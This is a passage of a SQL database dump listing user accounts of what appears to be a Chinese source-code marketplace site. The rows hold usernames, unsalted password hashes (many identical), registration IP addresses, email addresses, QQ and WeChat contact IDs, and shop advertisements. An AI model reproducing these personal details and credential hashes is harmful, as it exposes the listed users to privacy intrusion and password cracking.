(869, 'kSWSrZp45cen', '21ba6442fa6b1b588090532da458fdfec1fa1faf', '2019-04-30 14:21:34', '115.194.38.239', 1000, 10, 'kSWSrZp45cen', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '21ba6442fa6b1b588090532da458fdfec1fa1faf', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(868, 'DGMfEkZkmsWv', '27c2ba860cceef1392a7c88b35f1527bf604090f', '2019-04-30 14:21:34', '115.194.38.239', 1000, 10, 'DGMfEkZkmsWv', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '27c2ba860cceef1392a7c88b35f1527bf604090f', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(867, 'tXcbgYz6HGsk', '0b83f0274fa22a8e8dd2b15b4ad51ff93fc206de', '2019-04-30 14:21:34', '115.194.38.239', 1000, 10, 'tXcbgYz6HGsk', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '0b83f0274fa22a8e8dd2b15b4ad51ff93fc206de', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(866, 'HhDg79tsfNPH', '2069491af6fab458a969f4dce61a204752d27884', '2019-04-30 14:21:34', '115.194.38.239', 1000, 10, 'HhDg79tsfNPH', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2069491af6fab458a969f4dce61a204752d27884', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(865, 'wKbmyuckfFyU', '45c6818bf9f3acd53a38e184037b61f2f0ebe028', '2019-04-30 14:21:34', '115.194.38.239', 1000, 10, 'wKbmyuckfFyU', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '45c6818bf9f3acd53a38e184037b61f2f0ebe028', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(864, 'VgGYmDysN426', 'a33051573c6a7ddd1078510d605c4ec3dbdfeafc', '2019-04-30 14:21:34', '115.194.38.239', 1000, 10, 'VgGYmDysN426', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'a33051573c6a7ddd1078510d605c4ec3dbdfeafc', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(863, 'knEsuR9ezKAC', '84bba5abf1d16b599d4ae722450470893a2cd75e', '2019-04-30 14:21:34', '115.194.38.239', 1000, 10, 'knEsuR9ezKAC', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '84bba5abf1d16b599d4ae722450470893a2cd75e', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(862, 'VEZEdRnYkuHW', '146318a351bd6585aee618269aba7627b1708394', '2019-04-30 14:21:34', '115.194.38.239', 1000, 10, 'VEZEdRnYkuHW', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '146318a351bd6585aee618269aba7627b1708394', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(861, 'M7vu3F6kERk9', 'b6d8745938d15a29c06adc71a9c51b105829e8c6', '2019-04-30 14:21:34', '115.194.38.239', 1000, 10, 'M7vu3F6kERk9', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'b6d8745938d15a29c06adc71a9c51b105829e8c6', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(860, 'DdwztwKwNKXr', '04fefa576cf7aa24613e1e0e0ce0fa1102cc3c8b', '2019-04-30 14:21:34', '115.194.38.239', 1000, 10, 'DdwztwKwNKXr', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '04fefa576cf7aa24613e1e0e0ce0fa1102cc3c8b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(859, 'TbnEAzYMkgbm', 'e2f8e68d3280997f880989ddf6e74a3e4864ae93', '2019-04-30 14:21:34', '115.194.38.239', 1000, 10, 'TbnEAzYMkgbm', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'e2f8e68d3280997f880989ddf6e74a3e4864ae93', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(855, 'DHrxFyBFxbUe', '1f2eacaa42b4c794d09f815f7245303882cd4d83', '2019-04-30 14:21:34', '115.194.38.239', 1000, 10, 'DHrxFyBFxbUe', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1f2eacaa42b4c794d09f815f7245303882cd4d83', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL);
INSERT INTO `yjcode_user` (`id`, `uid`, `pwd`, `sj`, `uip`, `money1`, `jf`, `nc`, `mot`, `ifmot`, `email`, `ifemail`, `uqq`, `weixin`, `yxsj`, `openid`, `ifqq`, `djl`, `shopname`, `seokey`, `seodes`, `txt`, `pm`, `zt`, `openshop`, `shopzt`, `shopztsm`, `getpwd`, `bdmot`, `bdemail`, `txyh`, `txname`, `txzh`, `txkhh`, `zfmm`, `sellmall`, `sellmyue`, `tjuserid`, `sellbl`, `xinyong`, `sfz`, `sfzrz`, `sfzrzsm`, `uname`, `djmoney`, `pf1`, `pf2`, `pf3`, `baomoney`, `dqsj`, `userdj`, `userdjdq`, `ordertx1`, `ordertx2`, `wxopenid`, `myweb`, `unionid`, `mytxt`, `shoptype`, `openshop1`, `mybh`, `jbmot`, `ifmian`) VALUES
(856, 'bcz8HaYbZmTv', '251af8266a6ac06400c9c157c832751f21c1d08d', '2019-04-30 14:21:34', '115.194.38.239', 1000, 10, 'bcz8HaYbZmTv', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '251af8266a6ac06400c9c157c832751f21c1d08d', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(857, 'mRmfukkfGm6T', 'f27660b8413809197ac35b6e87bdff1a5919ba8f', '2019-04-30 14:21:34', '115.194.38.239', 1000, 10, 'mRmfukkfGm6T', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'f27660b8413809197ac35b6e87bdff1a5919ba8f', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(858, 'zepxhH8XVUrB', '8e965df52cfd530cc3cf80bcf99fd77477e417ce', '2019-04-30 14:21:34', '115.194.38.239', 1000, 10, 'zepxhH8XVUrB', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '8e965df52cfd530cc3cf80bcf99fd77477e417ce', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(950, 'BcEHFVXKm8MV', '6457eb962c5c281e8d373d7f7edf2d689c00f888', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'BcEHFVXKm8MV', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '6457eb962c5c281e8d373d7f7edf2d689c00f888', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(949, 'vestH8xxHpWx', '3c17b483d4ea4f188357f18c6de03827d4f66637', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'vestH8xxHpWx', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '3c17b483d4ea4f188357f18c6de03827d4f66637', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(948, 'TTXbyHhpm4Hx', '068373b119e93bfb43099f1ec9c2dd22aa9866ba', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'TTXbyHhpm4Hx', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '068373b119e93bfb43099f1ec9c2dd22aa9866ba', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(947, 'pPw8DbKPNPbS', '2645915082345e0bf6966f92be4ae50c1090d386', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'pPw8DbKPNPbS', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2645915082345e0bf6966f92be4ae50c1090d386', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(946, 'UWT4GNBPy8sr', '1bc5541176776c5380da129c9fe9f49fe4fb9258', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'UWT4GNBPy8sr', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1bc5541176776c5380da129c9fe9f49fe4fb9258', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(951, 'xiaoqi', '4a6c145437fbd60f73fcf7b5bc03608bda778805', '2019-05-10 14:49:06', '111.37.249.129', 1000, 10, '123', '', 0, '123@qq.com', 0, '123', NULL, '2019-05-10 14:49:21', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '4a6c145437fbd60f73fcf7b5bc03608bda778805', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0635621001557470951', NULL, NULL),
(952, 'vx15993997032', '588f4011c3c4bb4d8995144ce928bdf325303cb7', '2019-05-11 16:40:01', '125.127.38.92', 1000, 10, '小张哥谈支付', '', 0, '3382724976@qq.com', 0, '435809974', NULL, '2019-10-25 10:53:30', '', 0, 63, '零零壹软件城', '软件开发', '交易只是开始，服务永无止境。', '<p>智能养卡代还APP软件开发</p>', 0, 1, 0, 2, NULL, NULL, NULL, '090358', NULL, NULL, NULL, NULL, '588f4011c3c4bb4d8995144ce928bdf325303cb7', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, '2020-05-11 16:43:18', NULL, NULL, NULL, NULL, '', '', '', NULL, NULL, NULL, '0742411001557564160', NULL, NULL),
(953, 'ceshi11', '330ff0f5b3ebb023e592e9ab186a7f168c2b15b5', '2019-05-13 13:44:37', '42.236.177.24', 750, 10, 'ceshi11', '', 0, 'ceshi11@163.com', 0, 'ceshi11', '', '2019-05-13 14:20:14', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '330ff0f5b3ebb023e592e9ab186a7f168c2b15b5', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, '高级VIP', '2020-05-13 14:52:03', NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0709136001557726294', NULL, NULL),
(954, 'REhE6dpMvfUw', '7e30675416a0a4a094e3ef2562fb030d37011a85', '2019-05-13 14:54:31', '42.236.177.24', 1001, 10, 'REhE6dpMvfUw', '', 0, '', 0, '', NULL, '2019-05-13 15:39:34', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7e30675416a0a4a094e3ef2562fb030d37011a85', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0757423001557733174', NULL, NULL),
(955, 'ANKkhyfeBC66', 'c676758252abc9cc6524c5e3a1fea73a21f04dbd', '2019-05-13 14:54:31', '42.236.177.24', 50, 10, 'ANKkhyfeBC66', '', 0, '', 0, '', NULL, '2019-05-13 15:44:31', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'c676758252abc9cc6524c5e3a1fea73a21f04dbd', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0180914001557733247', NULL, NULL),
(956, '18549835985', 'f31072000f9398710ca196382667e0149385ee66', '2019-05-26 12:03:00', '124.160.214.121', 1000, 10, '18549835985', '', 0, '18549835985@qq.com', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'f31072000f9398710ca196382667e0149385ee66', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(957, 'adnin11', '68aeb8c02944e4f501a967b26125ee9dacf07edc', '2019-05-28 20:42:48', '182.97.64.138', 1000, 10, 'adnin11', '', 0, 'adnin11@qq.com', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '68aeb8c02944e4f501a967b26125ee9dacf07edc', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(959, 'qq1559379317206', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2019-06-01 16:55:17', '223.157.116.113', 1000, 10, '创想未来', '', 0, 'qq1559379317206@qq.com', 0, '', NULL, '2019-06-01 16:55:17', '3E868366E1D356EA70251430E4AA9696', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0675843001559379317', NULL, NULL),
(960, 'qq1559721664112', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2019-06-05 16:01:04', '113.65.214.4', 980, 20, '彪悍的人生不需要解析', '', 0, 'qq1559721664112@qq.com', 0, '', NULL, '2019-10-25 10:52:53', '5C10655A85864CC24B3811C889DB66B1', 1, 35, '测试', '鞋柜，化妆品展柜，服装柜', '您的支付密码与登录密码一致，建议立即修改!【点击修改支付密码】您的支付密码与登录密码一致，建议立即修改!【点击修改支付密码】您的支付密码与登录密码一致，建议立即修改!【点击修改支付密码】您的支付密码与登录密码一致，建议立即修改!【点击修改支付密码】', NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, '2020-06-05 16:07:46', '普通会员', NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0315690001559721664', NULL, NULL),
(961, 'qq1559808135205', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2019-06-06 16:02:15', '111.226.203.167', 900, 10, '云祈', '', 0, 'qq1559808135205@qq.com', 0, '', NULL, '2014-10-15 00:00:00', '1589E54888C53E3263D47A7A3DD197CE', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0441756001559808166', NULL, NULL),
(962, 'qq1559922324186', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2019-06-07 23:45:24', '49.74.37.184', 900, 10, 'a  BT论坛站长', '', 0, 'qq1559922324186@qq.com', 0, '', NULL, '2019-06-07 23:45:25', '9A0BA072CF0A891BA01E1E841CC61B22', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0166155001559922325', NULL, NULL),
(963, 'qq15602450889', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2019-06-11 17:24:48', '122.96.47.132', 1000, 10, '', '', 0, 'qq15602450889@qq.com', 0, '', NULL, '2014-10-15 00:00:00', 'CE5463F56BA9B379AA10101E8754ECC6', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(964, 'qq1560477002167', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2019-06-14 09:50:02', '118.249.120.92', 1000, 10, '无边漂泊', '', 0, 'qq1560477002167@qq.com', 0, '', NULL, '2014-10-15 00:00:00', 'B7F1B450DCC8F7738026AC50F5A146ED', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0609297001560477013', NULL, NULL),
(965, 'qq1560492581200', 'f7c3bc1d808e04732adf679965ccc34ca7ae3441', '2019-06-14 14:09:41', '1.194.64.111', 1000, 13, 'A、欢愉', '', 0, 'qq1560492581200@qq.com', 0, '', NULL, '2019-10-25 10:52:23', 'A83213D92E38E356DBC4963308F5D835', 1, 25, '欢愉源码', ' 源码修改，PHP网站建设,二次开发,采集器出售,接口对接，棋牌游戏，H5公众号游戏搭建，百余套演示可看 合作咨询看演示加扣扣：21319047 加微信yuqianhui23', '\r\n源码修改，PHP网站建设,二次开发,采集器出售,接口对接，棋牌游戏，H5公众号游戏搭建，百余套演示可看\r\n合作咨询看演示加扣扣：21319047 加微信yuqianhui23\r\n', NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, '2020-06-14 14:11:48', NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0778004001560492582', NULL, NULL),
(966, 'qq1560539241256', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2019-06-15 03:07:21', '180.123.223.218', 1000, 10, '涓埃之微', '', 0, 'qq1560539241256@qq.com', 0, '', NULL, '2014-10-15 00:00:00', '1B7D7626DBC60B26D4BE3576224AFD44', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(967, 'qq1560699405259', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2019-06-16 23:36:45', '106.58.231.149', 400, 10, '家（思）', '', 0, 'qq1560699405259@qq.com', 0, '', NULL, '2019-06-16 23:36:45', '1D00BE597BA241EC1D5D9F758055BED4', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0741940001560699405', NULL, NULL),
(968, 'qq1560741320184', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2019-06-17 11:15:20', '42.236.179.84', 1000, 10, '小张', '', 0, 'qq1560741320184@qq.com', 0, '', NULL, '2019-06-17 11:15:20', 'F517F3BCEBE707D77CBEA6B57F21D031', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0738734001560741320', NULL, NULL),
(969, 'qq156093375977', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2019-06-19 16:42:39', '219.157.183.249', 400, 10, '山顶', '', 0, 'qq156093375977@qq.com', 0, '', NULL, '2014-10-15 00:00:00', 'CD8DB0DE378CD31A52A26D3C1E7189BA', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(970, 'ceshi1', 'e1d1128cf06a468101ee631b18e768f311403c19', '2019-06-19 16:46:14', '219.157.183.249', 1000, 10, 'ceshi1', '', 0, '1322300062@qq.com', 0, '1322300062', NULL, '2019-06-19 16:46:14', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'e1d1128cf06a468101ee631b18e768f311403c19', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0145792001560933974', NULL, NULL),
(971, 'qq1561055287287', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2019-06-21 02:28:07', '111.174.81.55', 1000, 10, '皇冠', '', 0, 'qq1561055287287@qq.com', 0, '', NULL, '2019-06-21 02:28:07', '9D4203B5D6AC158D0083B3523A654A29', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0748687001561055287', NULL, NULL),
(972, 'qq1561062006267', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2019-06-21 04:20:06', '58.243.254.3', 1000, 10, '', '', 0, 'qq1561062006267@qq.com', 0, '', NULL, '2014-10-15 00:00:00', '49C5813552E8857500948A616EB18BF5', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(973, 'qq1561081388180', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2019-06-21 09:43:08', '1.194.69.228', 1000, 10, '加：21319047', '', 0, 'qq1561081388180@qq.com', 0, '', NULL, '2019-06-21 09:43:08', '04545EA2DEB6848F934F468FB52ACB54', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0801237001561081388', NULL, NULL),
(974, 'qq156110455291', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2019-06-21 16:09:12', '119.130.215.237', 900.1, 10, '已回不到过去', '', 0, 'qq156110455291@qq.com', 0, '', NULL, '2019-06-21 16:10:42', '8F7BA27A229239480F5751BD8EA075F4', 1, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0191758001561104563', NULL, NULL);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_userdj`
--

CREATE TABLE IF NOT EXISTS `yjcode_userdj` (
